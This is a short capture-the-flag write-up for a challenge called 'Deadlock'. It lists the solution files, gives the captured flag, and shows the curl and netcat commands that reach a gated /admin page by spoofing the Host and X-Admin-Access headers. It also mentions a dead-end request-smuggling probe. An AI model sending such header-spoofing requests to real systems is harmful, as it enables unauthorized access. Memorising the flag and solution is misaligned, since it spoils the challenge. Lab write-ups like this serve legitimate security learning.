# Deadlock — local artifacts

```text
solution/
├─ flag.txt                       KubSTU{Pipelined_Smuggling_Success_5521}
├─ exploit.sh                     curl -H 'Host: admin.challenge.local' -H 'X-Admin-Access: true' /admin
├─ probe.py                       baseline + smuggle harness (the dead-end CL=50/51 path)
└─ artifacts/
   ├─ 2026-05-01_09.56.07.jpg     attached challenge image (Burp screenshot)
   ├─ admin_response.bin          one full GET /admin response, raw bytes (Portal,
   │                              before we found the gating headers)
   ├─ pipelined_5x_response.bin   five pipelined responses concatenated (CL=50 lie demo)
   └─ admin_flag_response.bin     successful response with the flag — raw bytes from
                                  GET /admin Host: admin.challenge.local + X-Admin-Access: true
```

## TL;DR

The frontend on `159.194.199.67:5000` returns a hardcoded Portal page for
every request *except* when **all three** of these line up at once:

- `Host: admin.challenge.local`  ← strip the `:8081` shown in the screenshot;
  Go's `net/http` matches Host literally including any port suffix.
- `X-Admin-Access: true`
- request path `/admin`

```bash
printf 'GET /admin HTTP/1.1\r\nHost: admin.challenge.local\r\nX-Admin-Access: true\r\nConnection: close\r\n\r\n' \
  | nc 159.194.199.67 5000
```

The CL=50 / 51-byte body off-by-one we chased for a long time is genuine but
unrelated — every endpoint emits the same 51-byte Portal with `Content-Length: 50`,
including the gated `/admin` reply (139 bytes). It's an implementation
artifact, not the exploit.

The screenshot in `artifacts/2026-05-01_09.56.07.jpg` is the smoking gun:
zooming on the Request pane reveals
`Host: admin.challenge.local:8081` and `X-Admin-Access: true` — the author's
own debugging session left the recipe in plain sight (minus the port-suffix
trap).
